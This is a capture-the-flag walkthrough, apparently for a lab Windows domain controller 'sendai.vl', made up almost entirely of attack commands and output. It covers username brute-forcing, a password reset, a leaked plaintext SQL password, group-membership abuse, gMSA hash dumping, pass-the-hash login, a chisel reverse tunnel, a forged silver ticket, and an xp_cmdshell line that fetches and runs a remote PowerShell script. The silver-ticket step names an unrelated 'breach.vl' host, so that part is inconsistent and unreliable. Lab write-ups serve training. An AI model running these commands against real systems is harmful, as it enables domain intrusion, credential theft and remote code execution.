Scan : 

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-02 22:57:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2024-08-02T22:43:16
|_Not valid after:  2025-08-02T22:43:16
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2024-08-02T22:43:16
|_Not valid after:  2025-08-02T22:43:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2024-08-02T22:43:16
|_Not valid after:  2025-08-02T22:43:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2024-08-02T22:43:16
|_Not valid after:  2025-08-02T22:43:16
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-02T22:58:32+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2024-08-01T22:52:14
|_Not valid after:  2025-01-31T22:52:14
| rdp-ntlm-info:
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-02T22:57:52+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-02T22:57:56
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

Enum Username :
```sh
nxc smb $t -u Guest -p '' --rid-brute
```

```sh

sqlsvc
websvc
Dorothy.Jones
Kerry.Robinson
Naomi.Gardner
Anthony.Smithcat 
Susan.Harper
Stephen.Simpson
Marie.Gallagher
Kathleen.Kelly
Norman.Baxter
Jason.Brady
Elliot.Yates
Malcolm.Smith
Lisa.Williams
Ross.Sullivan
Clifford.Davey
Declan.Jenkins
Lawrence.Grant
Leslie.Johnson
Megan.Edwards
Thomas.Powell
mgtsvc$  
```

```sh
netexec smb $t -u users.txt -p "" --no-bruteforce --continue-on-success
```

```sh
smbpasswd.py -newpass '123Pentest_123' "sendai.vl"/"Thomas.Powell":''@$t


===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version
===============================================================================

Current SMB password:
[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

```sh
cat .sqlconfig

Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;#
```

```sh
bloodyAD --host "$t" -d "sendai.vl" -u "Thomas.Powell" -p "123Pentest_123" add groupMember admsvc Thomas.Powell

[+] Thomas.Powell added to admsvc
```

```sh
gMSADumper.py -u 'Thomas.Powell' -p '123Pentest_123' -d 'sendai.vl'

Users or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::3157ca48ba7575a2a501729af5eda7c4
mgtsvc$:aes256-cts-hmac-sha1-96:e5690ba2941be7e5f3f33def770b257adb3e4f2a092cdcedfff72fc3c4fed2e8
mgtsvc$:aes128-cts-hmac-sha1-96:55d896e1da9bc6aba65db6ec43d1dc1e

```

```sh
evil-winrm -i $t -u "mgtsvc$" -H "3157ca48ba7575a2a501729af5eda7c4"
```

User VL{e015461ca5ecaeb714cb231fd719be62}


Pivot: 
```sh
# On your local machine
./chisel server -p 8888 -reverse
```

```sh
# On the remote host
./chisel client 10.8.3.12:8888 R:1080:socks &

./chisel.exe client 10.8.3.12:8888 R:1080:socks 
```

```sh
proxychains -q nmap -sT localhost
```


```sh
ticketer.py -nthash 58655C0B90B2492F84FB46FA78C2D96A -domain-sid S-1-5-21-3085872742-570972823-736764132-1104 -domain sendai.vl -dc-ip dc.sendai.vl -spn  MSSQL/dc.sendai.vl administrator
```

```sh
export KRB5CCNAME=MSSQLSvc.breachdc.breach.vl:1433.ccach

mssqlclient.py -k breachdc.breach.vl -no-pass -debug
```

```sh
EXEC xp_cmdshell 'powershell -Command "& {IEX (New-Object Net.WebClient).DownloadString(''http://10.8.3.12:8080/shell.ps1'')}"';
```

- Privesc with seimpersonate 

Root VL{ae138bcfb077995339a717a28a23fd61}